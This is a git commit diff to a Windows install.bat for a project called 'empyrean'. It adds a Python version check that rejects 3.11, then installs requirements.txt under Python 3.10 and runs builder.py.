ed3a5162d72f5357b5a08b5e46ed078527d05a65
yvvi <125154957+yvvi@users.noreply.github.com>
2023-02-20 08:43:19 -0500

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,3 +1,19 @@
 @echo off
-pip install -r requirements.txt
-python source/builder.py
+title moon
+color 0a
+cls
+
+python --version 2>&1 | findstr " 3.11" >nul
+if %errorlevel% == 0 (
+    echo python 3.11.x and up are not supported by empyrean. Please downgrade to python 3.10.x.
+    pause
+    exit
+)
+
+py -3.10 -m pip install --upgrade -r requirements.txt
+
+cls
+
+py -3.10 builder.py
+
+pause
